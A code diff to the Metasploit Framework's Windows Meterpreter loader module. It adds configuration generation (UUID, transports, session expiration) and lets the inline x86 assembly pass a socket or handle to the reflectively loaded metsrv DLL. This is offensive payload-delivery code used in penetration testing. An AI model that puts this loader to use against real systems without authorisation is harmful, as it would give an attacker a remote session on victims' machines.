@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/reflective_dll_loader'
+require 'rex/payloads/meterpreter/config'
 
 module Msf
 
@@ -27,7 +28,7 @@ module Payload::Windows::MeterpreterLoader
       ],
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
-      'PayloadCompat' => { 'Convention' => 'sockedi -https', },
+      'PayloadCompat' => { 'Convention' => 'sockedi handleedi -https', },
       'Stage'         => { 'Payload'   => "" }
       ))
   end
@@ -52,9 +53,9 @@ module Payload::Windows::MeterpreterLoader
           add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
     ^
 
-    unless opts[:stageless]
+    unless opts[:stageless] || opts[:force_write_handle] == true
       asm << %Q^
-          mov [ebx], edi        ; write the current socket to the config
+          mov [ebx], edi        ; write the current socket/handle to the config
       ^
     end
 
@@ -66,14 +67,41 @@ module Payload::Windows::MeterpreterLoader
     ^
   end
 
-  def stage_meterpreter(stageless=false)
+  def stage_payload(opts={})
+    stage_meterpreter(opts) + generate_config(opts)
+  end
+
+  def generate_config(opts={})
+    ds = opts[:datastore] || datastore
+    opts[:uuid] ||= generate_payload_uuid
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      arch:              opts[:uuid].arch,
+      null_session_guid: opts[:null_session_guid] == true,
+      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
+      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid:              opts[:uuid],
+      transports:        opts[:transport_config] || [transport_config(opts)],
+      extensions:        [],
+      stageless:         opts[:stageless] == true
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
+  end
+
+  def stage_meterpreter(opts={})
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))
 
     asm_opts = {
       rdi_offset: offset,
       length:     dll.length,
-      stageless:  stageless
+      stageless:  opts[:stageless] == true
     }
 
     asm = asm_invoke_metsrv(asm_opts)
